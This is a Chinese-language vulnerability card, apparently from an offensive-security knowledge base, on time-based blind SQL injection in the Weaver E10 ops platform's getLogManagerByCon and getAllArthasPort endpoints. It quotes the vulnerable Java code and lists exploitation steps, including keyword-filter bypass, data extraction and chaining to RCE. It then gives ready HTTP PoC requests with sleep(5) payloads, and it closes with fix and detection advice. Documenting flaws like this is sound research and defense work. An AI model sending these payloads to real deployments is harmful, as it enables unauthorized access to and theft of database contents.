---
id: web-generic-sqli-weaver-e10-logmanager-arthasport-searchinput
title: 泛微 E10 getLogManagerByCon/getAllArthasPort 拼接 searchInput SQL 注入：sleep 时间盲注
type: scenario
domain: web
path: web/generic/sqli
technique: weaver-e10-logmanager-arthasport-searchinput-sqli
aliases:
- 泛微 E10 SQL 注入
- getLogManagerByCon 注入
- getAllArthasPort searchInput 注入
- e-monitor 时间盲注
- sleep(5) 注入
tags:
- java
- sqli
- blind-sqli
- h2
- jdbc-template
- weaver
- ecology
- e10
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V222
  verified_at: '2026-11-07T06:44:53+08:00'
  notes: 已对照原文 LogManagementService.getLogManagerByCon/ArthasTools.getAllArthasPort/MonitorAgentService.getPageMS 反编译及 H2 报错日志核对；原文仅确认注入存在、未做数据提取或提权，卡片已如实标注。
---

## 一句话结论

泛微 E10 运维平台的 `LogManagementService.getLogManagerByCon` 把 `queryIp`/`serviceName`/`logName`/`logPath` 直接拼进 SQL 单引号中，`ArthasTools.getAllArthasPort` 也把 `searchInput` 直接拼进 `LIKE '%...%'`；攻击者用 `' or 1=sleep(5) or '` 一类 payload 即可触发时间盲注，文章在 H2 环境中通过 SQL 报错确认注入存在。

## 原理

- `getLogManagerByCon` 关键代码：
  ```java
  String checkIp = req.get("queryIp") + "";
  ...
  if (null != checkIp && checkIp.length() > 0 && !checkIp.contains("\0")) {
      sb.append(", SERVERIP = '" + checkIp + "'");
  }
  ...
  querySqlBycon = querySqlBycon + KeywordConstant._WHERE_ + sb.toString().replaceFirst(",", "");
  list = jdbcTemplate.queryForList(querySqlBycon);
  ```
  只检查 NUL 字符，没有参数化/转义；单引号闭合后即可注入任意 SQL 片段。
- `getAllArthasPort` 关键代码：
  ```java
  if (StringUtils.isNotEmpty(searchInput)) {
      sql = sql + " and si.server_name like '%" + searchInput + "%'";
  }
  ```
  `%' or 1=sleep(5) or '%` 可闭合 LIKE 并加入 `OR sleep(5)`。
- `MonitorAgentService.getPageMS` 也把 `keyword` 追加到 `and m1.monitorstatus = ...` 之后，属于同类拼接。
- 文章在 H2 环境发送 `queryIp` 为 `,where 1111111=sleep(5), where '1'='1` 的请求，服务端日志报 SQL 语法错误并回显拼接后的语句，证明注入可达；实际环境可能是 MySQL，Druid 过滤器会拦截部分关键字，需要按目标数据库调整 payload。
- 文章明确表示未继续利用该 SQL 注入获取服务器权限，因此本卡只证明注入原语与时间盲注路径，数据提取/提权未验证。

## 触发条件

- 目标为泛微 E10 运维管理平台（文章测试 Ecology10.0.2403.01）。
- `getLogManagerByCon` 可通过 `/sapi/bs/getLogManagerByCon`（`/sapi/bs/**` 白名单，未授权）调用；`getAllArthasPort` 位于 `/cp/`，需要 token/会话（可配合鉴权绕过创建管理员）。
- 后端使用 H2/MySQL 等支持 `sleep()` 的数据库；Druid 过滤器/关键字黑名单可能拦截 `sleep`、`union`、`select` 等。
- 需要能观察响应时间或错误回显。

## 利用步骤

1. 向 `/sapi/bs/getLogManagerByCon` 发送正常 JSON 确认参数名：`queryIp`、`serviceName`、`logName`、`logPath`。
2. 在 `queryIp` 中注入 `' or 1=sleep(5) or '`（或文章使用的 `,where 1111111=sleep(5), where '1'='1`），比较响应时间。
3. 对 `/cp/getAllArthasPort.json` 的 `searchInput` 注入 `%' or 1=sleep(5) or '%`，带 token 发送。
4. 若关键字被 Druid 拦截，尝试大小写/注释/等价函数（`benchmark`、`pg_sleep`）或其它注入点；确认盲注后可逐步布尔/时间提取数据。
5. 用泄露的数据库内容衔接后台账号、配置或其它 RCE 链。

## PoC

```http
POST /sapi/bs/getLogManagerByCon HTTP/1.1
Host: target:9081
Content-Type: application/json;charset=UTF-8

{"queryIp":"' or 1=sleep(5) or '","serviceName":"","logName":"","logPath":""}
```

```http
POST /cp/getAllArthasPort.json HTTP/1.1
Host: target:9081
token: <token>
Cookie: JSESSIONID=<session>; userToken=<token>
Content-Type: application/json;charset=utf-8

{"searchInput":"%' or 1=sleep(5) or '%"}
```

## 变体与关联

- **注入点变体**：`MonitorAgentService.getPageMS` 的 `keyword` 同样拼接进 SQL；`getLogManagerByCon` 的四个参数都可尝试。
- **数据库差异**：H2 用 `sleep()`/`CSVREAD`，MySQL 用 `sleep()`/`LOAD_FILE`，不同环境需换函数；Druid 过滤器可能要求绕过关键字。
- **关联**：[[web-generic-sqli-weaver-e9-doc-out-more-list-boolean-blind]]（泛微 e9 未授权布尔盲注，可对比同类产品的注入点）、[[web-java-framework-spring-weaver-e10-sapi-bs-wildcard-auth-bypass-admin]]（本卡未授权入口的来源）。

## 检测与防御

- **修复**：所有 SQL 使用 `PreparedStatement`/`JdbcTemplate` 参数绑定；`LIKE` 使用 `?` 并转义 `%`/`_`；禁止把用户输入拼进 SQL 字符串。
- **加固**：Druid 过滤器开启并升级规则；数据库账号最小权限；关闭不必要的错误回显。
- **检测**：监控 `queryIp`/`searchInput` 等参数中的单引号、`sleep(`、`or 1=1`、注释符；审计 SQL 异常日志与响应时间异常。
